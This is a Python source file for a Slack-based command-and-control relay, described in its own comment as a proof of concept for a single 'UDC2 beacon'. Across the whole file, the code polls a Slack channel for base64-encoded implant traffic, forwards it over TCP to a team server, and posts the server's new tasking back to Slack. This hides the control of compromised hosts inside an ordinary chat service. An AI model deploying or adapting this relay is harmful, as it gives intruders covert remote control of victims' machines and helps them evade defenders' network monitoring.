#!/usr/bin/env python3
import threading
import queue
import logging
import signal
import time
import argparse
import json
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, asdict
import socket
import base64
import struct
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError

# ---------------------------
# Configuration
# ---------------------------

@dataclass
class Config:
    # Follow README.md on how to configure the Slack workplace
    slack_token: str = 'xoxb-TOKEN-HERE'
    slack_client_channel: str = 'REPLACE-TOKEN'
    slack_server_channel: str = 'REPLACE-TOKEN'
    ts_addr: str = '127.0.0.1'
    ts_port: int = 2222
    max_fragment_size: int = 65491
    log_level: str = 'INFO'
    connection_timeout: int = 300
    enable_metrics: bool = False
    config_file: Optional[str] = None

    @classmethod
    def from_file(cls, file_path: str) -> 'Config':
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
            return cls(**data)
        except Exception as e:
            logging.error(f"Failed to load config from {file_path}: {e}")
            return cls()

    def save_to_file(self, file_path: str) -> None:
        try:
            with open(file_path, 'w') as f:
                json.dump(asdict(self), f, indent=2)
        except Exception as e:
            logging.error(f"Failed to save config to {file_path}: {e}")


# ---------------------------
# Metrics
# ---------------------------

class ServerMetrics:
    def __init__(self):
        self.messages_received = 0
        self.messages_sent = 0
        self.active_connections = 0
        self.errors_count = 0
        self.start_time = time.time()
        self._lock = threading.Lock()

    def increment_messages_received(self): 
        with self._lock:
            self.messages_received += 1

    def increment_messages_sent(self):
        with self._lock:
            self.messages_sent += 1

    def increment_errors(self):
        with self._lock:
            self.errors_count += 1

    def set_active_connections(self, count: int):
        with self._lock:
            self.active_connections = count

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            uptime = time.time() - self.start_time
            return {
                'uptime_seconds': uptime,
                'messages_received': self.messages_received,
                'messages_sent': self.messages_sent,
                'active_connections': self.active_connections,
                'errors_count': self.errors_count,
                'messages_per_second': self.messages_received / uptime if uptime > 0 else 0
            }


# ---------------------------
# Beacon Manager
# ---------------------------

class BeaconManager:
    def __init__(self):
        self.beacons: Dict[str, Dict[str, Any]] = {}
        self.beacon_out: Dict[str, Dict[str, Any]] = {}
        self.lock = threading.Lock()
        self.fragment_timeout = 300  # 5 minutes

    def add_message(self, user_id: str, payload: bytes):
        """Store incoming message as a beacon for relay."""
        with self.lock:
            self.beacons[user_id] = {
                'payload': payload,
                'timestamp': time.time()
            }

    def add_response(self, user_id: str, response_frame: bytes):
        with self.lock:
            self.beacon_out[user_id] = {
                'frame': response_frame,
                'fragments': {},
                'timestamp': time.time()
            }

    def get_response(self, user_id: str) -> Optional[Dict[str, Any]]:
        with self.lock:
            return self.beacon_out.get(user_id)

    def remove_response(self, user_id: str):
        with self.lock:
            self.beacon_out.pop(user_id, None)

    def cleanup_expired(self):
        current_time = time.time()
        with self.lock:
            expired_beacons = [uid for uid, data in self.beacons.items() 
                               if current_time - data['timestamp'] > self.fragment_timeout]
            for uid in expired_beacons:
                logging.warning(f"Cleaning up expired beacon for {uid}")
                del self.beacons[uid]

            expired_responses = [uid for uid, data in self.beacon_out.items()
                                 if current_time - data['timestamp'] > self.fragment_timeout]
            for uid in expired_responses:
                logging.warning(f"Cleaning up expired response for {uid}")
                del self.beacon_out[uid]

# ---------------------------
# Team Server Connection Manager
# ---------------------------

class ConnectionManager:
    """Manages connections to the team server."""
    
    def __init__(self, config: Config):
        self.config = config
        self.active_connections: Dict[int, socket.socket] = {}
        self.lock = threading.Lock()
        
    def get_connection(self, custom_id: str) -> socket.socket:
        """Get or create connection for a custom ID."""
        with self.lock:
            if custom_id not in self.active_connections:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.config.connection_timeout)
                    sock.connect((self.config.ts_addr, self.config.ts_port))
                    
                    # Send initial "go" frame
                    self._send_frame(sock, b"go")
                    
                    self.active_connections[custom_id] = sock
                    logging.info(f"Connected to team server for custom ID {(custom_id)}")
                    
                except socket.timeout:
                    logging.error(f"Timeout connecting to team server for ID {(custom_id)}")
                    raise
                except Exception as e:
                    logging.error(f"Failed to connect to team server for ID {(custom_id)}: {e}")
                    raise
            
            return self.active_connections[custom_id]
    
    def close_connection(self, custom_id: str) -> None:
        """Close connection for a custom ID."""
        with self.lock:
            if custom_id in self.active_connections:
                try:
                    self.active_connections[custom_id].close()
                except Exception as e:
                    logging.warning(f"Error closing connection for ID {(custom_id)}: {e}")
                finally:
                    del self.active_connections[custom_id]
    
    def close_all_connections(self) -> None:
        """Close all active connections."""
        with self.lock:
            # Safely extract all connections while holding the lock
            connections_to_close = [(custom_id, sock) for custom_id, sock in self.active_connections.items()]
            # Clear the dictionary immediately
            self.active_connections.clear()
        
        # Close all sockets outside the lock to avoid any potential issues
        for custom_id, sock in connections_to_close:
            try:
                sock.close()
                logging.debug(f"Closed connection for ID {(custom_id)}")
            except Exception as e:
                logging.warning(f"Error closing connection for ID {(custom_id)}: {e}")

    @staticmethod
    def _send_frame(sock: socket.socket, payload: bytes) -> None:
        """Send a frame with 4-byte length prefix."""
        length = len(payload)
        frame = struct.pack('<I', length) + payload
        sock.sendall(frame)
    
    @staticmethod
    def _receive_frame(sock: socket.socket) -> bytes:
        """Receive a frame: 4-byte length prefix followed by payload."""
        length_bytes = sock.recv(4)
        if len(length_bytes) != 4:
            raise ConnectionError("Failed to read frame length")
        
        length = struct.unpack('<I', length_bytes)[0]
        if length > 10 * 1024 * 1024:  # 10MB limit
            raise ValueError(f"Frame too large: {length} bytes")
        
        payload = b''
        while len(payload) < length:
            chunk = sock.recv(length - len(payload))
            if not chunk:
                raise ConnectionError("Connection closed while reading payload")
            payload += chunk
        
        # Return the complete frame (length prefix + payload) for team server protocol
        return length_bytes + payload
    
# ---------------------------
# Slack Server
# ---------------------------

class SlackServer:
    def __init__(self, config: Config):
        self.config = config
        self.beacon_manager = BeaconManager()
        self.connection_manager = ConnectionManager(config)
        self.metrics = ServerMetrics() if config.enable_metrics else None
        self.shutdown_event = threading.Event()
        self.relay_queue: queue.Queue = queue.Queue()
        self.threads: List[threading.Thread] = []

        self.slack_client = WebClient(token=self.config.slack_token)
        self._setup_logging()
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _setup_logging(self):
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='%(asctime)s - %(levelname)s - [%(threadName)s] %(message)s'
        )

    def _signal_handler(self, signum, frame):
        logging.info(f"Received signal {signum}, shutting down")
        self.shutdown_event.set()

    # ---------------------------
    # Slack Message Handling
    # ---------------------------

    def slack_listener(self) -> None:
        """Poll Slack messages from client channel and queue them for relay."""
        logging.info("Slack listener started")
        last_ts = None
        while not self.shutdown_event.is_set():
            try:
                response = self.slack_client.conversations_history(
                    channel=self.config.slack_client_channel,
                    oldest=last_ts,
                    limit=100
                )
                messages = response.get('messages', [])
                for msg in reversed(messages):
                    user_id = 1 # this is a basic PoC, supporting only 1 UDC2 beacon. To support multiple beacons, additional development must be made like the official ICMP Bof.
                    text = msg.get('text', '')
                    ts = msg.get('ts')
                    if ts and (last_ts is None or float(ts) > float(last_ts)):
                        last_ts = ts
                    if text is not None or text !="":
                        print("[+] Received beacon data: " + text)
                        text = base64.b64decode(text)
                        self.beacon_manager.add_message(user_id, text)
                        self.relay_queue.put((user_id, text))
                        if self.metrics:
                            self.metrics.increment_messages_received()

                time.sleep(1.0)
            except SlackApiError as e:
                logging.error(f"Slack API error: {e.response['error']}")
                time.sleep(5)
            except Exception as e:
                logging.error(f"Slack listener error: {e}")
                time.sleep(5)

    def slack_send_message(self, user_id: str, payload: str):
        """Send message back to Slack channel."""
        try:
            self.slack_client.chat_postMessage(
                channel=self.config.slack_server_channel,
                text=payload)
            if self.metrics:
                self.metrics.increment_messages_sent()
        except SlackApiError as e:
            logging.error(f"Failed to send Slack message: {e.response['error']}")

    # ---------------------------
    # Team Server Relay
    # ---------------------------

    def ts_relay_worker(self):
        logging.info("Team server relay worker started")
        while not self.shutdown_event.is_set():
            try:
                try:
                    user_id, payload = self.relay_queue.get(timeout=1.0)
                except queue.Empty:
                    continue
                if user_id is None:
                    continue
                self._relay_to_team_server(user_id, payload)
                self.relay_queue.task_done()
            except Exception as e:
                logging.error(f"Relay worker error: {e}")
                if self.metrics:
                    self.metrics.increment_errors()

    def _relay_to_team_server(self, user_id: str, payload: bytes):
        try:
            sock = self.connection_manager.get_connection(user_id)
            # Send payload to team server
            sock.sendall(payload)
            logging.debug(f"Payload for custom ID {(user_id)} relayed successfully")
            
            # Receive the response from TeamServer (new task for client)
            response_frame = self.connection_manager._receive_frame(sock)

            response_frame = base64.b64encode(response_frame).decode('utf-8')
            print("Beacon tasked with a new job")

            # Send the new task for client to Slack client channel 
            self.slack_send_message(user_id, response_frame)

            if self.metrics:
                self.metrics.set_active_connections(len(self.connection_manager.active_connections))

        except Exception as e:
            logging.error(f"Error communicating with team server for {user_id}: {e}")
            self.connection_manager.close_connection(user_id)
            if self.metrics:
                self.metrics.increment_errors()

    # ---------------------------
    # Cleanup Worker
    # ---------------------------

    def cleanup_worker(self):
        logging.info("Cleanup worker started")
        while not self.shutdown_event.is_set():
            if self.shutdown_event.wait(30):
                break
            self.beacon_manager.cleanup_expired()
            if self.metrics:
                stats = self.metrics.get_stats()
                logging.info(f"Server stats: {stats}")

    # ---------------------------
    # Server Lifecycle
    # ---------------------------

    def start(self):
        logging.info("Starting Slack UDC2 Server...")

        threads = [
            threading.Thread(target=self.slack_listener, name="SlackListener", daemon=True),
            threading.Thread(target=self.ts_relay_worker, name="TSRelayWorker", daemon=True),
            threading.Thread(target=self.cleanup_worker, name="CleanupWorker", daemon=True)
        ]
        for thread in threads:
            thread.start()
            self.threads.append(thread)

        try:
            while not self.shutdown_event.is_set():
                self.shutdown_event.wait(1)
        finally:
            self._shutdown()

    def _shutdown(self):
        logging.info("Shutting down server...")
        self.shutdown_event.set()
        self.connection_manager.close_all_connections()
        for thread in self.threads:
            thread.join(timeout=5.0)
        logging.info("Server shutdown complete")


# ---------------------------
# Argument Parsing & Main
# ---------------------------

def parse_arguments():
    parser = argparse.ArgumentParser(description='Slack UDC2 Server')
    parser.add_argument('--config', '-c', type=str, help='Path to configuration file')
    parser.add_argument('--slack-token', type=str, help='Slack bot token')
    parser.add_argument('--slack-channel', type=str, help='Slack channel ID')
    parser.add_argument('--ts-addr', type=str, default='127.0.0.1', help='Team server address')
    parser.add_argument('--ts-port', type=int, default=2222, help='Team server port')
    parser.add_argument('--log-level', type=str, default='INFO',
                        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'])
    parser.add_argument('--enable-metrics', action='store_true', help='Enable metrics')
    parser.add_argument('--generate-config', type=str, help='Generate a sample configuration file')
    return parser.parse_args()


def main():
    args = parse_arguments()

    if args.generate_config:
        config = Config()
        config.save_to_file(args.generate_config)
        print(f"Sample configuration file generated: {args.generate_config}")
        return

    config = Config.from_file(args.config) if args.config else Config()

    if args.slack_token:
        config.slack_token = args.slack_token
    if args.slack_channel:
        config.slack_channel = args.slack_channel
    if args.ts_addr:
        config.ts_addr = args.ts_addr
    if args.ts_port:
        config.ts_port = args.ts_port
    if args.enable_metrics:
        config.enable_metrics = True
    if args.log_level:
        config.log_level = args.log_level

    server = SlackServer(config)
    server.start()


if __name__ == '__main__':
    main()
